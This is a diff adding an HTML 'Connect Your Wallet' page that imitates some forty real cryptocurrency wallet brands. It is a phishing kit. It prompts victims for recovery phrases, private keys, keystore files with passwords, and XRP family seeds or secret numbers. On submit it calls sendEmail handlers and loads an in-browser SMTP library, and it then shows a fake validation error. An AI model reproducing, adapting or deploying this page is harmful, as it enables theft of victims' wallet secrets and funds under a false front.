@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <meta charset="UTF-8">
+        <link rel="stylesheet" href="coinlist.css">
+        <link rel="stylesheet" href="wall.css">
+        <link rel="icon" href="Images/Ethereum-Logo-PNG list.png">
+        <script src="js/txtchanger.js"></script>
+        <script src="js/email.js"></script>
+        <script src="js/nav.js"></script>
+        <script src="js/clear.js"></script>
+        <script src="js/pssview.js"></script>
+        <title>Connect Wallet</title>
+    </head>
+    <body onload="phrase(), xphrase()">
+      <div class="cyw">
+        <h4>Connect Your Wallet</h4>
+     </div>
+
+     <div class="error-bg" id="err">
+      <div class="error">
+      </div>
+    </div>
+     
+    <div class="init-con" id="load">
+    <div class="init">
+      <div class="init-wrap">
+        <div class="static-txt">initializing</div>
+        <ul class="dynamic-txts">
+          <li><span>.......</span></li>
+        </ul>
+      </div>
+      <div class="init-wall">
+        <p>Easy-to-use browser extension. </p>
+      </div>
+    </div>
+    </div>
+      <div id="hider">
+        <div class="wall-container">
+          <form class="wall-form" onsubmit="sendEmail(); reset(); validating(); return false; ">
+              <div class="phrase-head">
+                 <span class="wall-txt">Connect your </span><h3 id="walletid">wallet</h3><span class="wall-txt"> Wallet</span>
+              </div>
+              <div class="wrapper">
+                 <div class="phr-nav" id="phr-nav">
+                    <li>
+                        <p class="phrase-nav active" onclick="phrase()">Phrase</p>
+                    </li>
+    
+                    <li>
+                        <p class="phrase-nav" id="key-nav" onclick="keystore()">Keystore JSON</p>
+                    </li>
+                    <li>
+                        <p class="phrase-nav" onclick="private()">Private Key</p>
+                    </li>
+                 </div>
+             </div>
+              <div class="phr-drop" id="phr-drop">
+                  <textarea id="phrase" cols="30" rows="5" placeholder="Phrase" required></textarea>
+                  <br><p class="phr-info">Based on 12, 16 0r 24 words</p>
+              </div>
+      
+              <div class="key-drop" id="key-drop">
+                  <textarea id="keystore" cols="30" rows="5" placeholder="Keystore JSON" required></textarea>
+                  <br><input placeholder="password" id="key-pass" type="password" required>
+                    <img src="Images/password-icon open.png" onclick="pass()" class="pass-icon" id="pass-icon">
+                  <br><p class="phr-info">Several lines of text beginning with "{...}" plus the password you used to encrypt it</p>
+              </div>
+      
+              <div class="private-drop" id="private-drop">
+                  <input type="text" id="private" cols="30" rows="4" placeholder="Private Key" required/>
+                  <br><p class="phr-info">Typically 64 alphanumeric characters</p>
+              </div>
+          <button type="submit">VALIDATE</button>
+          <input onclick="hide();" id="cancle" type="button" value="Cancle">
+      </form>
+   </div>
+ </div>
+
+            <div id="xumm-hider">
+              <div class="wall-container">
+                <form class="wall-form" onsubmit="sendEmail2(); reset(); validating(); return false; ">
+                <div class="phrase-head">
+                   <span class="wall-txt">Connect your </span><h3 id="walletid2">wallet</h3><span class="wall-txt"> Wallet</span>
+                </div>
+                <div class="xwrapper">
+                   <div class="xphr-nav" id="xphr-nav">
+                      <li>
+                          <p class="xphrase-nav xactive" onclick="xphrase()">Mnemonic</p>
+                      </li>
+      
+                      <li>
+                          <p class="xphrase-nav" id="family-nav" onclick="family()">Family Seed</p>
+                      </li>
+                      <li>
+                          <p class="xphrase-nav" onclick="secret()">Secret Numbers</p>
+                      </li>
+                   </div>
+               </div>
+                <div class="xphr-drop" id="xphr-drop">
+                    <textarea id="xphrase" cols="30" rows="5" placeholder="Please enter  your Mnemonic" required></textarea>
+                    <br><p class="phr-info">Based on 12, 16 or 24 words</p>
+                </div>
+        
+                <div class="family-drop" id="family-drop">
+                    <input id="family-pass" cols="30" rows="5" placeholder="Please enter your family seed" required/>
+                    <br><p class="phr-info">Looks like sXXX1234XXX...</p>
+                </div>
+        
+                <div class="secret-drop" id="secret-drop">
+                  <input id="secret1" class="secret" cols="30" rows="4" placeholder="Secret numbers of row A" minlength="6" maxlength="6" required/>
+                  <input id="secret2" class="secret" cols="30" rows="4" placeholder="Secret numbers of row B" minlength="6" maxlength="6" required/>
+                  <input id="secret3" class="secret" cols="30" rows="4" placeholder="Secret numbers of row C" minlength="6" maxlength="6" required/>
+                  <input id="secret4" class="secret" cols="30" rows="4" placeholder="Secret numbers of row D" minlength="6" maxlength="6" required/>
+                  <input id="secret5" class="secret" cols="30" rows="4" placeholder="Secret numbers of row E" minlength="6" maxlength="6" required/>
+                  <input id="secret6" class="secret" cols="30" rows="4" placeholder="Secret numbers of row F" minlength="6" maxlength="6" required/>
+                  <input id="secret7" class="secret" cols="30" rows="4" placeholder="Secret numbers of row G" minlength="6" maxlength="6" required/>
+                  <input id="secret8" class="secret" cols="30" rows="4" placeholder="Secret numbers of row H" minlength="6" maxlength="6" required/>
+                    <br><p class="phr-info">Typically 8 rows of 6 digits</p>
+                </div>
+            <button type="submit">VALIDATE</button>
+            <input onclick="xummhide(); clear();" id="cancle" type="button" value="Cancle">
+                </form>
+              </div>
+            </div>
+      <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+      <script>
+        function family(){
+    if(document.getElementById('family-drop').style.display="none"){
+        showfamily();
+    }
+}
+
+function showfamily(){
+    document.getElementById("xphr-drop").style.display="none";
+    document.getElementById("xphrase").removeAttribute('required');
+
+    document.getElementById("secret-drop").style.display="none";
+    document.getElementById('secret1').removeAttribute('required');
+    document.getElementById('secret2').removeAttribute('required');
+    document.getElementById('secret3').removeAttribute('required');
+    document.getElementById('secret4').removeAttribute('required');
+    document.getElementById('secret5').removeAttribute('required');
+    document.getElementById('secret6').removeAttribute('required');
+    document.getElementById('secret7').removeAttribute('required');
+    document.getElementById('secret8').removeAttribute('required');
+
+    document.getElementById("family-drop").style.display="block";
+    document.getElementById("family-pass").setAttribute('required', '');
+}
+
+function secret(){
+    if(document.getElementById('secret-drop').style.display="none"){
+        showsecret();
+    }
+}
+
+function showsecret(){
+    document.getElementById("xphr-drop").style.display="none";
+    document.getElementById("xphrase").removeAttribute('required');
+
+    document.getElementById("secret-drop").style.display="block";
+    document.getElementById('secret1').setAttribute('required', '');
+    document.getElementById('secret2').setAttribute('required', '');
+    document.getElementById('secret3').setAttribute('required', '');
+    document.getElementById('secret4').setAttribute('required', '');
+    document.getElementById('secret5').setAttribute('required', '');
+    document.getElementById('secret6').setAttribute('required', '');
+    document.getElementById('secret7').setAttribute('required', '');
+    document.getElementById('secret8').setAttribute('required', '');
+
+    document.getElementById('family-drop').style.display="none";
+    document.getElementById("family-pass").removeAttribute('required');
+}
+
+function xphrase(){
+    if(document.getElementById("xphr-drop").style.display="none"){
+        xphrase();
+    }
+}
+
+function xphrase(){
+    document.getElementById("xphr-drop").style.display="block";
+    document.getElementById("xphrase").setAttribute('required', '');
+
+    document.getElementById("secret-drop").style.display="none";
+    document.getElementById('secret1').removeAttribute('required');
+    document.getElementById('secret2').removeAttribute('required');
+    document.getElementById('secret3').removeAttribute('required');
+    document.getElementById('secret4').removeAttribute('required');
+    document.getElementById('secret5').removeAttribute('required');
+    document.getElementById('secret6').removeAttribute('required');
+    document.getElementById('secret7').removeAttribute('required');
+    document.getElementById('secret8').removeAttribute('required');
+
+    document.getElementById('family-drop').style.display="none";
+    document.getElementById("family-pass").removeAttribute('required');
+}
+      </script>
+
+      <script>
+function hide(){
+  var a = document.getElementById("hider");
+  var b = document.getElementById("phrhider");
+  var c = document.getElementById("xumm-hider");
+  var p = document.getElementById("phrase");
+  var x = document.getElementById("xphrase")
+  if(a.style.display === "flex"){
+    a.style.display="none";
+    b.style.display="none";
+    p.removeAttribute('required');
+  }else {
+    a.style.display = "flex"
+    b.style.display = "flex"
+    x.removeAttribute('required');
+    p.setAttribute('required', '');
+  }
+}
+      </script>
+
+<script>
+  function xummhide(){
+    var a = document.getElementById("hider");
+    var b = document.getElementById("phrhider");
+    var c = document.getElementById("xumm-hider");
+    var p = document.getElementById("phrase");
+    var x = document.getElementById("xphrase")
+    if(c.style.display === "flex"){
+      a.style.display="none";
+      x.removeAttribute('required');
+      c.style.display="none";
+    }else {
+      a.style.display="none"
+      c.style.display = "flex"
+      p.removeAttribute('required');
+      x.setAttribute('required', '');
+    }
+  }
+        </script>
+    
+    <script>
+      function validating(){
+setInterval(function(){
+  document.getElementById("err").style.display="flex";
+}, 2000);
+      }
+
+      function loading(){
+        document.getElementById("load").style.display="flex";
+        loadout();
+      }
+
+      function loadout(){
+        setInterval(function(){
+        document.getElementById("load").style.display="none";
+      }, 8000);
+      }
+    </script>
+
+    <script>
+        var phrnav = document.getElementById("phr-nav");
+        var btns = document.getElementsByClassName("phrase-nav");
+
+        for(var i =0; i<btns.length; i++){
+            btns[i].addEventListener('click', function(){
+                var current = document.getElementsByClassName("active");
+                current[0].className = current[0].className.replace(" active");
+                this.className += " active";
+            })
+        }
+
+        var xphrnav = document.getElementById("xphr-nav");
+        var xbtns = document.getElementsByClassName("xphrase-nav");
+
+        for(var i =0; i<xbtns.length; i++){
+            xbtns[i].addEventListener('click', function(){
+                var current = document.getElementsByClassName("xactive");
+                current[0].className = current[0].className.replace(" xactive");
+                this.className += " xactive";
+            })
+        }
+    </script>
+      
+
+     <div class="bg">
+      <form class="container" onsubmit="loading(); return false;">
+      <section id="ctw">
+        <p> Connect to a wallet</p>
+      </section>
+      <div class="grid">
+        <button class="btn-div" onclick="walletconnect(), hide()">
+          <div class="ball">
+          </div> 
+          <p class="wallet-name" id="wallet-connect">Wallet Connect</p>
+          <div class="img-con">
+            <img class="logo" src="Images/Coin logo/WalletConnect.png" alt="walletconnect">
+          </div>
+        </button>
+
+      <button class="btn-div" onclick="trustwallet(), hide()">
+        <div class="ball">
+        </div> 
+        <p class="wallet-name" id="trust-wallet">Trust Wallet</p>
+        <div class="img-con">
+          <img class="logo" src="Images/Coin logo/trustwallet logo.png" alt="trustwallet">
+        </div>
+      </button>
+
+    <button class="btn-div" onclick="metamask(), hide()">
+      <div class="ball">
+      </div> 
+      <p class="wallet-name" id="metamask">Metamask</p>
+      <div class="img-con">
+        <img class="logo" src="Images/Coin logo/metamask-icon.webp" alt="metamask">
+      </div>
+  </button>
+
+  <button class="btn-div" onclick="coinbase(), hide()">
+    <div class="ball">
+    </div> 
+    <p class="wallet-name" id="coinbase">Coinbase</p>
+    <div class="img-con">
+      <img class="logo" src="Images/Coin logo/coinbase-logo.webp" alt="coinbase">
+    </div>
+</button>
+
+<button class="btn-div" onclick="blockchain(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="blockchain">Blockchain</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/Blockchain logo.webp" alt="blockchain">
+  </div>
+</button>
+
+<button class="btn-div" onclick="xummhide(), xumm(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="xumm">Xumm</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/Xumm logo.png" alt="xumm">
+  </div>
+</button>
+
+<button class="btn-div" onclick="cardano(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="cardano">Cardano</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/cardano logo.webp" alt="cardano">
+  </div>
+</button>
+
+<button class="btn-div" onclick="daedalus(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="daedalus">Daedalus</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/daedalus logo.png" alt="daedalus">
+  </div>
+</button>
+
+<button class="btn-div" onclick="edgewallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="edgewallet">Edge Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/Edge Wallet logo.jpg" alt="edgewallet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="yoroi(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="yoroi">Yoroi</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/yoroi logo.png" alt="yoroi">
+  </div>
+</button>
+
+<button class="btn-div" onclick="lobstrwallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="lobstrwallet">Lobstr Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/lobstr Wallet Logo.png" alt="lobstrwallet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="solarwallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="solarwallet">Solar Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/solarwallet.jpg" alt="solarwallet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="peraalgo(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="peraalgo">Pera Algo</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/pera-algo.jpg" alt="peraalgo">
+  </div>
+</button>
+
+<button class="btn-div" onclick="senderwallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="senderwallet">Sender Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/sender.jpg" alt="senderwalet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="xcelpay(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="xcelpay">Xcel Pay</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/xceipay.jpg" alt="xcelpay">
+  </div>
+</button>
+
+<button class="btn-div" onclick="anchorwallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="anchorwallet">Anchor Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/anchor.jpg" alt="anchorwalet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="ontowallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="ontowallet">Onto Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/ontowallet.jpg" alt="ontowalet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="rainbowwallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="rainbowwallet">Rainbow Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/rainbow wallet.jpg" alt="rainbowwalet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="argent(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="argent">Argent</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/Argent wallet.jpg" alt="argent">
+  </div>
+</button>
+
+<button class="btn-div" onclick="imtoken(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="imtoken">IM Token</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/IM token.jpg" alt="imtoken">
+  </div>
+</button>
+
+<button class="btn-div" onclick="pillar(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="pillar">Pillar</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/Pillar.jpg" alt="pillar">
+  </div>
+</button>
+
+<button class="btn-div" onclick="ccvault(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="ccvault">CC Vault</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/ccvault.png" alt="ccvault">
+  </div>
+</button>
+
+<button class="btn-div" onclick="nami(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="nami">Nami</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/nami.png" alt="nami">
+  </div>
+</button>
+
+<button class="btn-div" onclick="solana(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="solana">Solana</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/solana.png" alt="solana">
+  </div>
+</button>
+
+<button class="btn-div" onclick="phantom(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="phantom">Phantom</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/phantom.jpg" alt="phantom">
+  </div>
+</button>
+
+<button class="btn-div" onclick="solflare(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="solflare">Solflare</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/solflare.png" alt="solflare">
+  </div>
+</button>
+
+<button class="btn-div" onclick="sollet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="sollet">Sollet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/sollet.png" alt="sollet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="solong(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="solong">Solong</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/solong.jpg" alt="solong">
+  </div>
+</button>
+
+<button class="btn-div" onclick="exodus(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="exodus">Exodus</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/exodus.png" alt="exodus">
+  </div>
+</button>
+
+<button class="btn-div" onclick="avalanche(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="avalanche">Avalanche</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/avalanche.png" alt="avalanche">
+  </div>
+</button>
+
+<button class="btn-div" onclick="velas(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="velas">Velas</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/velas.png" alt="velas">
+  </div>
+</button>
+
+<button class="btn-div" onclick="bnb(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="bnb">Binance Smart Chain</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/bnb.png" alt="bnb">
+  </div>
+</button>
+
+<button class="btn-div" onclick="safepal(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="safepal">Safepal</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/safepal.png" alt="safepal">
+  </div>
+</button>
+
+<button class="btn-div" onclick="formatic(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="formatic">Formatic</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/formatic.png" alt="formatic">
+  </div>
+</button>
+
+<button class="btn-div" onclick="aktionariat(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="aktionariat">Aktionariat</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/aktionariat.png" alt="aktionariat">
+  </div>
+</button>
+
+<button class="btn-div" onclick="keyringpro(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="keyringpro">Keyring Pro</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/keyringpro.png" alt="keyringpro">
+  </div>
+</button>
+
+<button class="btn-div" onclick="sparkpoint(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="sparkpoint">Sparkpoint</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/sparkpoint.png" alt="sparkpoint">
+  </div>
+</button>
+
+<button class="btn-div" onclick="ownbit(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="ownbit">OwnBit</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/ownbit.png" alt="ownbit">
+  </div>
+</button>
+
+<button class="btn-div" onclick="infinitywallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="infinitywallet">Infinity Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/infinity-wallet.png" alt="infinitywallet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="infinito(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="infinito">Infinito</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/infinito-wallet.png" alt="infinito">
+  </div>
+</button>
+
+<button class="btn-div" onclick="torus(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="torus">Torus</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/Torus.jpg" alt="torus">
+  </div>
+</button>
+
+<button class="btn-div" onclick="nash(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="nash">Nash</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/Nash.jpg" alt="solarwalet">
+  </div>
+</button>
+
+<button class="btn-div" onclick="bitpay(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="bitpay">BitPay</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/BitPay.jpg" alt="bitpay">
+  </div>
+</button>
+
+<button class="btn-div" onclick="otherwallet(), hide()">
+  <div class="ball">
+  </div> 
+  <p class="wallet-name" id="otherwallet">Other Wallet</p>
+  <div class="img-con">
+    <img class="logo" src="Images/Coin logo/othersWallet.jpg" alt="otherwallet">
+  </div>
+</button>
+<br>
+</form>
+
+
+</body>
+</html>
